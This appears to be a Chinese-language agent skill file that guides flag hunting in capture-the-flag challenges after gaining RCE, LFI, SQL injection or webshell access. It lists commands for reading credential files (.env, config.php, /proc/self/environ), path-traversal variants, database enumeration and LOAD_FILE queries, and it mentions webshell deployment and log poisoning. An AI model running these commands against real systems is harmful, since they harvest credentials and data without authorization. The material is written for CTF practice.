---
name: ctf-flag-hunting
description: "CTF 挑战中的 Flag 搜索策略。当通过 RCE/LFI/SQLi/webshell 等方式获得目标访问权限后、使用常规 ls/cat 命令找不到 flag 时使用。覆盖文件系统、数据库、环境变量、源码、内存等所有 flag 可能的存储位置。按成功率排序的搜索优先级——先试标准路径，再搜索全盘"
metadata:
  tags: "ctf,flag,搜索,hunting,文件系统,数据库,环境变量,rce,getflag"
  category: "ctf"
---

# CTF Flag 搜索策略

## ⛔ 深入参考（补充读物）

- 完整搜索路径和命令 → [references/flag-search-paths.md](references/flag-search-paths.md)
- 本 skill 已包含核心搜索路径，references 用于补充极端情况

---

## Phase 1: 按权限类型选择搜索策略

```
你有什么权限？
├─ 命令执行（RCE）→ Phase 2
├─ 文件读取（LFI）→ Phase 3
├─ 数据库访问（SQLi）→ Phase 4
└─ Web 管理后台 → Phase 5
```

---

## Phase 2: RCE — 文件系统搜索

**优先级顺序（按成功率排列）：**

### 2.1 标准 flag 路径（先试这些，一次试完）

```bash
cat /flag.txt && cat /flag && cat /root/flag.txt && cat /home/*/flag.txt
```

### 2.2 非标准路径（标准路径失败后）

```bash
cat /var/www/html/flag.txt
cat /var/www/html/flag.php
cat /tmp/flag
cat /tmp/flag.txt
cat /opt/flag.txt
cat /app/flag.txt

ls /root
ls /tmp
```

### 2.3 全盘搜索（路径不确定时）

```bash
find / -name "flag*" 2>/dev/null
find / -name "*.txt" -path "*/flag*" 2>/dev/null
grep -r "flag{" / --include="*.txt" --include="*.php" --include="*.html" 2>/dev/null
```

### 2.4 环境变量和进程

```bash
env | grep -i flag
cat /proc/self/environ | tr '\0' '\n' | grep -i flag
cat /proc/self/cmdline | tr '\0' '\n' | grep -i flag
```

### 2.5 数据库配置 → 查库

```bash
cat /var/www/html/config.php    # 数据库连接凭据
cat /var/www/html/.env          # 环境变量泄露
cat /app/config.py
```

找到数据库凭据后：
```bash
mysql -u <user> -p<password> -e "SHOW DATABASES; USE <db>; SHOW TABLES; SELECT * FROM flag;"
```

### 2.6 进程和网络

```bash
ps aux | grep -i flag      # 进程命令行参数
netstat -tlnp              # 内网服务可能有 flag
lsof -i                    # 开放端口对应的服务
```

---

## Phase 3: LFI — 文件读取搜索

LFI 比 RCE 限制更多——只能读文件，不能执行命令。

**路径遍历找 flag 时，对每个深度同时尝试多种文件名变体：**

```
# 每个深度都要批量测试这些变体（不要只试 flag 不试 flag.txt！）
../flag          ../flag.txt        ../.flag         ../flag.md
../../flag       ../../flag.txt     ../../.flag
../../../flag    ../../../flag.txt  ../../../.flag
# 同时测试绝对路径
/flag            /flag.txt          /root/flag.txt   /tmp/flag
```

> ⚠️ **常见失败模式**：只尝试 `../flag` 而忽略 `../flag.txt`，导致超时。务必同时发送带后缀和不带后缀的变体。

**优先级顺序：**

1. **标准 flag 路径**：对每个深度（`../`、`../../`、`../../../`）同时尝试 `flag`、`flag.txt`、`.flag`、`flag.md`
2. **确认可读性**：`/etc/passwd` 能读 → 说明 LFI 有效
3. **配置文件**（找更多凭据）：
   ```
   /var/www/html/config.php
   /var/www/html/.env
   /proc/self/environ
   /proc/self/mounts
   ```
4. **源码文件**：`/var/www/html/index.php`、`/app/app.py` — 可能发现 RCE 入口
5. **日志文件**：`/var/log/apache2/access.log` — 日志投毒准备

**LFI 转 RCE**（读完配置后仍找不到 flag）：
- Session 文件包含 → 参考 `lfi-rfi-methodology` Phase 4
- 日志投毒 → 参考 `lfi-rfi-methodology` Phase 4

---

## Phase 4: SQLi — 数据库搜索

```sql
-- 1. 列出现有数据库
SHOW DATABASES;

-- 2. 切换后列出表
USE <db>;
SHOW TABLES;

-- 3. 直接查 flag 表
SELECT * FROM flag;
SELECT * FROM flags;
SELECT * FROM secret;
SELECT * FROM secret_table;

-- 4. 不知道表名时搜索
SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%flag%';

-- 5. 读取文件（需要 FILE 权限）
SELECT LOAD_FILE('/flag.txt');
```

---

## Phase 5: Web 管理后台搜索

1. **翻遍所有页面** — flag 可能在非标准页面（"关于"、"帮助"、"调试"）
2. **用户相关字段** — notes、bio、email、description 中可能藏 flag
3. **系统配置页** — 「系统信息」「服务器状态」可能显示 flag
4. **文件管理/模板编辑** — 可写文件时直接部署 webshell
5. **源码注释** — 搜索 HTML 注释、JS 注释中的 flag 字符串

---

## Phase 6: 搜不到 flag 时

标准路径都试过仍找不到，尝试以下降级手段：

1. **切换提取方式**：
   - RCE 盲注：利用时间延迟或 DNS 外带逐字符提取
   - LFI 配合竞争条件或 PHP session 包含
2. **扩大搜索范围**：
   - 数据库其他表：`SELECT * FROM users LIMIT 10;` — flag 可能泄露在用户数据里
   - 历史命令：`history` — 之前做过的操作可能遗留 flag 路径
3. **找其他入口**：
   - 翻 Jenkins/GitLab/后台管理 — 也许有 flag 公开在那
   - 检查 nginx/apache 配置文件：`/etc/nginx/sites-enabled/` — 路径映射可能泄露
4. **利用题目暗示**：
   - 题目名称往往暗示 flag 位置（如 `baby_pwn` → pwn 类题目）
   - 描述中的关键词（"database"、"source"）指向搜索方向

---

## Flag 格式识别

- `flag{hex_string}` — 最常见，32/40/64 字符
- `flag{string}`、`CTF{string}` — 小写或其他前缀
- 纯字符串（题目会说明）

**假 flag 陷阱**：`flag{test}`、`flag{this_is_not_the_flag}` 是迷惑项。

---

## 注意事项

- **先验证再提交**：拿到 flag 后用 `ctf-flag-verification` 验证格式和长度
- **假 flag 判断**：长度/字符异常，很可能是迷惑项
- **LFI 优先读配置**：配置文件能告诉你数据库密码，从数据库找 flag 比猜路径可靠
- **RCE 优先查库**：很多 CTF 的 flag 不在文件系统里，在数据库中
